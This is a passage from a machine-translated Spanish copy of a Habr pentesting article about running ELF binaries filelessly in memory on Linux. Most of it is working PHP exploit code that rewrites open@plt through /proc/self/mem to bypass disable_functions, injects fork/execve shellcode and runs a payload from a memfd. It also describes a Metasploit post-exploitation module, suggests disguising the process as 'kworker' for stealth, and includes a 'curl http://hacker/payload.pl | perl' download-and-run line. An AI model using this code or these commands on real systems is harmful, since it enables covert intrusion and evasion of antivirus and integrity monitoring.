class="hljs-number"><span class="hljs-number">10000</span></span> + $version[<span class="hljs-number"><span class="hljs-number">1</span></span>] * <span class="hljs-number"><span class="hljs-number">100</span></span> + $version[<span class="hljs-number"><span class="hljs-number">2</span></span>])); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (PHP_VERSION_ID &lt; <span class="hljs-number"><span class="hljs-number">50207</span></span>) { define(<span class="hljs-string"><span class="hljs-string">'PHP_MAJOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">0</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_MINOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">1</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_RELEASE_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">2</span></span>]); } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PHP major version "</span></span> . PHP_MAJOR_VERSION . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p>  Verificamos la profundidad de bits del sistema operativo y la versi√≥n del kernel de Linux: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strpos(php_uname(<span class="hljs-string"><span class="hljs-string">'a'</span></span>), <span class="hljs-string"><span class="hljs-string">'x86_64'</span></span>) === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] This exploit is for x64 Linux. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(substr(php_uname(<span class="hljs-string"><span class="hljs-string">'r'</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>) &lt; <span class="hljs-number"><span class="hljs-number">2.98</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Too old kernel (&lt; 2.98). Might not work\n"</span></span>; }</code> </pre> <br><p>  Para eludir las restricciones de <code>disable_functions</code> , el script reescribe la direcci√≥n de la funci√≥n <code>open@plt</code> sobre la marcha.  Hicimos algunas adiciones al c√≥digo beched'a, y ahora podemos poner nuestro c√≥digo shell en la memoria. </p><br><p>  Primero necesita encontrar el cambio en el archivo binario del int√©rprete PHP, para esto recurrimos a <code>/proc/self/exe</code> y analizamos el archivo ejecutable usando la funci√≥n <code>parseelf()</code> descrita anteriormente: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open@plt offset in PHP binary\n"</span></span>; $open_php = parseelf(<span class="hljs-string"><span class="hljs-string">'/proc/self/exe'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($open_php == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[+] Offset is 0x'</span></span> . dechex($open_php) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $maps = file_get_contents(<span class="hljs-string"><span class="hljs-string">'/proc/self/maps'</span></span>); preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(/.+libc\-.+)#'</span></span>, $maps, $r); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Libc location: $r[1]\n"</span></span>; preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(.+\[stack\].*)#'</span></span>, $maps, $m); $stack = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $m[<span class="hljs-number"><span class="hljs-number">1</span></span>])[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Stack location: "</span></span>.dechex($stack).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $pie_base = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $maps)[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PIE base: "</span></span>.dechex($pie_base).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open and system symbols from Libc\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">list</span></span>($system_offset, $open_offset) = parseelf($r[<span class="hljs-number"><span class="hljs-number">1</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($system_offset == <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> $open_offset == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p>  Encuentre la direcci√≥n de la funci√≥n <code>open()</code> : </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Got them. Seeking for address in memory\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'rb'</span></span>); fseek($mem, ((PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base) + $open_php); $open_addr = unp(fread($mem, <span class="hljs-number"><span class="hljs-number">8</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[INFO] open@plt addr: 0x'</span></span> . dechex($open_addr) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Rewriting open@plt address\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'wb'</span></span>);</code> </pre> <br><p>  Ahora puede ir directamente a descargar nuestro archivo ejecutable. <br>  Primero, cree un archivo an√≥nimo: </p><br><pre> <code class="php hljs">$shellcode_loc = $pie_base + <span class="hljs-number"><span class="hljs-number">0x100</span></span>; $shellcode=<span class="hljs-string"><span class="hljs-string">"\x48\x31\xD2\x52\x54\x5F\x6A\x01\x5E\x68\x3F\x01\x00\x00\x58\x0F\x05\x5A\xC3"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fseek($mem, (PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base + $open_php); fwrite($mem, packlli($shellcode_loc)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Address written. Executing cmd\n"</span></span>; $fp = fopen(<span class="hljs-string"><span class="hljs-string">'fd'</span></span>, <span class="hljs-string"><span class="hljs-string">'w'</span></span>);</code> </pre> <br><p>  Escribimos la carga en un archivo an√≥nimo: </p><br><pre> <code class="php hljs">fwrite($fp, $elf);</code> </pre> <br><p>  Estamos buscando el n√∫mero de descriptor de archivo: </p><br><pre> <code class="php hljs">$found = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $fds = scandir(<span class="hljs-string"><span class="hljs-string">"/proc/self/fd"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>($fds <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $fd) { $path = <span class="hljs-string"><span class="hljs-string">"/proc/self/fd/$fd"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!is_link($path)) <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strstr(readlink($path), <span class="hljs-string"><span class="hljs-string">"memfd"</span></span>)) { $found = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!$found) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[-] memfd not found'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p>  A continuaci√≥n, escribimos la ruta al archivo ejecutable en la pila: </p><br><pre> <code class="php hljs">fseek($mem, $stack); fwrite($mem, <span class="hljs-string"><span class="hljs-string">"{$path}\x00"</span></span>); $filename_ptr = $stack; $stack += strlen($path) + <span class="hljs-number"><span class="hljs-number">1</span></span>; fseek($mem, $stack);</code> </pre> <br><p>  Y los argumentos para ejecutar pasaron al ejecutable: </p><br><pre> <code class="php hljs">fwrite($mem, str_replace(<span class="hljs-string"><span class="hljs-string">" "</span></span>, <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, $args) . <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>); $str_ptr = $stack; $argv_ptr = $arg_ptr = $stack + strlen($args) + <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>(explode(<span class="hljs-string"><span class="hljs-string">' '</span></span>, $args) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $arg) { fseek($mem, $arg_ptr); fwrite($mem, packlli($str_ptr)); $arg_ptr += <span class="hljs-number"><span class="hljs-number">8</span></span>; $str_ptr += strlen($arg) + <span class="hljs-number"><span class="hljs-number">1</span></span>; } fseek($mem, $arg_ptr); fwrite($mem, packlli(<span class="hljs-number"><span class="hljs-number">0x0</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Argv: "</span></span> . $args . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p>  Luego, al llamar a <code>fork()</code> , ejecutamos nuestra carga √∫til: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Starting ELF\n"</span></span>; $shellcode = <span class="hljs-string"><span class="hljs-string">"\x6a\x39\x58\x0f\x05\x85\xc0\x75\x28\x6a\x70\x58\x0f\x05\x6a\x39\x58\x0f\x05\x85\xc0\x75\x1a\x48\xbf"</span></span> . packlli($filename_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\xbe"</span></span> . packlli($argv_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\x31\xd2\x6a\x3b\x58\x0f\x05\xc3\x6a\x00\x5f\x6a\x3c\x58\x0f\x05"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fopen(<span class="hljs-string"><span class="hljs-string">'done'</span></span>, <span class="hljs-string"><span class="hljs-string">'r'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>();</code> </pre> <br><h4 id="shellkod">  Shellcode </h4><br><p>  Shellcode generalmente significa una secuencia de bytes que se almacenan en la memoria y luego se ejecutan, generalmente en el contexto de otro programa, utilizando ataques de desbordamiento de b√∫fer y otros.  En nuestro caso, el shellcode no nos devuelve el s√≠mbolo del sistema del servidor remoto (en realidad Shell), pero nos permite ejecutar los comandos que necesitamos. </p><br><p>  Para obtener la secuencia de bytes requerida, puede escribir el c√≥digo C, luego traducirlo al lenguaje ensamblador o escribir el lenguaje ensamblador desde cero. </p><br><p>  Veamos qu√© se esconde detr√°s de la secuencia de bytes de los listados anteriores. </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p>  El lanzamiento de nuestro programa comienza con c <code>fork</code> .  57 es el valor num√©rico del identificador de llamada del sistema para sistemas de 64 bits.  La tabla se puede encontrar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> . </p><br><p>  A continuaci√≥n, llamamos <code>setsid</code> (identificador num√©rico 112) para convertir el proceso hijo al padre: </p><br><pre> <code class="plaintext hljs">push 112 pop rax syscall</code> </pre> <br><p>  Luego haz otro <code>fork</code> : </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p>  Luego ejecute el familiar <code>execve()</code> : </p><br><pre> <code class="plaintext hljs">; execve mov rdi, 0xcafebabecafebabe ; filename mov rsi, 0xdeadbeefdeadbeef ; argv xor rdx, rdx ; envp push 0x3b pop rax syscall push -1 pop rax ret</code> </pre> <br><p>  Y terminamos el proceso con <code>exit()</code> (60): </p><br><pre> <code class="plaintext hljs">; exit quit: push 0 pop rdi push 60 pop rax syscall</code> </pre> <br><p>  Por lo tanto, reemplazamos el c√≥digo de funci√≥n open () sobre la marcha.  Nuestro archivo ejecutable se coloc√≥ en la memoria y se ejecut√≥ por medio del int√©rprete PHP.  Las llamadas al sistema se presentan como c√≥digos de shell. </p><br><h3 id="metasploit-framework">  Metasploit framework </h3><br><p>  Como una compilaci√≥n de las t√©cnicas anteriores, hemos preparado un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">m√≥dulo para MSF</a> . </p><br><p>  Para agregarlo a Metasploit, simplemente copie el archivo del m√≥dulo en el directorio <code>$HOME/.msf4/module/post/linux/manage/download_exec_elf_in_memory.rb</code> y luego ejecute el comando <code>reload_all</code> en la consola del framework. <br>  Para usar nuestro m√≥dulo, ingrese <code>use post/linux/manage/download_exec_elf_in_memory</code> (u otra ruta, dependiendo del directorio en el que se coloc√≥ el archivo del m√≥dulo) <br>  Antes de usarlo, debe configurar las opciones necesarias.  La lista de opciones se muestra con el comando <code>show options</code> . </p><br><p>  <code>ARGS</code> - Argumentos para el ejecutable </p><br><p>  <code>FILE</code> : ruta al archivo ejecutable.  En nuestro caso, este es Netcat. </p><br><p>  <code>NAME</code> es el nombre del proceso.  Puedes llamarlo como quieras.  Por ejemplo, en aras del sigilo, esto puede ser kworker: 1 bien, o con el fin de demostrar algo c√≥mico, por ejemplo KittyCat </p><br><p>  <code>SESSION</code> - sesi√≥n de meterpreter.  Se entiende que este m√≥dulo se utilizar√° para fines posteriores a la operaci√≥n. </p><br><p>  A continuaci√≥n, <code>SRVHOST</code> el <code>SRVHOST</code> en el que se <code>SRVHOST</code> el servidor http con nuestra carga y su puerto en las <code>SRVPORT</code> <code>SRVHOST</code> y <code>SRVPORT</code> respectivamente. </p><br><p>  <code>VECTOR</code> : el m√©todo por el cual se lograr√° la ejecuci√≥n del programa en la memoria, el par√°metro es opcional, si est√° vac√≠o, el script determinar√° la presencia de los int√©rpretes necesarios.  PHP, Python o Perl son actualmente compatibles. </p><br><p>  <code>run</code> usando el comando <code>exploit</code> o <code>run</code> </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/y9vRUItW_5c" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><p>  Funciona de la siguiente manera: indicamos la sesi√≥n deseada, puede ser meterpreter o un shell inverso normal.  A continuaci√≥n, indicamos la ruta local a nuestro duende, los argumentos y el nombre deseado en la lista de procesos.  Despu√©s del comienzo, se lanzar√° un servidor web local para alojar la carga √∫til, y la sesi√≥n buscar√° "mecedoras", curl y wget son compatibles actualmente.  Despu√©s de encontrar al menos uno de ellos, se buscar√°n todos los int√©rpretes si no hemos especificado en el par√°metro <code>VECTOR</code> cu√°l necesitamos.  Bueno, si tiene √©xito, se ejecutar√° un comando para descargar la carga √∫til de nuestro servidor web y transferirla por conducto al int√©rprete deseado, es decir.  algo as√≠ como <code>$ curl http://hacker/payload.pl | perl</code> <code>$ curl http://hacker/payload.pl | perl</code> </p><br><h3 id="vmesto-zaklyucheniya">  En lugar de una conclusi√≥n. </h3><br><p>  La descarga sin archivos de archivos ELF en Linux es una t√©cnica √∫til para las pruebas de penetraci√≥n.  Este es un m√©todo bastante silencioso que puede soportar una amplia gama de herramientas de protecci√≥n antivirus, sistemas de monitoreo de integridad y sistemas de monitoreo que monitorean los cambios en el contenido del disco duro.  De esta manera, puede mantener f√°cilmente el acceso al sistema de destino, mientras deja un m√≠nimo de rastros. <br>  En este art√≠culo, utilizamos lenguajes de programaci√≥n interpretados, a menudo instalados por defecto en distribuciones de Linux, firmware, enrutadores y dispositivos m√≥viles.  Tambi√©n me gustar√≠a agradecer al autor de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">este art√≠culo</a> , que nos inspir√≥ a esta revisi√≥n. </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es430902/">https://habr.com/ru/post/es430902/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es430890/index.html">Donde √°gil es terrible, especialmente scrum</a></li>
<li><a href="../es430892/index.html">La combinaci√≥n del enfoque multiplataforma y nativo en el desarrollo de aplicaciones m√≥viles.</a></li>
<li><a href="../es430894/index.html">Situaci√≥n: las marcas gastan cada vez m√°s dinero en publicidad en podcasts: entendemos por qu√©</a></li>
<li><a href="../es430896/index.html">Linux Foundation ha establecido fondos para GraphQL y Ceph: por qu√© son necesarios y qu√© esperar de ellos</a></li>
<li><a href="../es430900/index.html">El primer l√°ser de la historia: qu√© fue</a></li>
<li><a href="../es430906/index.html">Mam√° duerme tranquilamente por la noche: recolectamos OpenCV para Raspbian'a</a></li>
<li><a href="../es430908/index.html">M√≥dulo de control del convertidor de potencia: desarrollo y montaje</a></li>
<li><a href="../es430910/index.html">Beca Fulbright: ¬øC√≥mo y por qu√©?</a></li>
<li><a href="../es430912/index.html">Traemos un mentiroso al agua limpia: una entrevista no es una relaci√≥n laboral. Naturalmente</a></li>
<li><a href="../es430914/index.html">An√°lisis de los precios del mercado negro para datos personales y penetraci√≥n</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>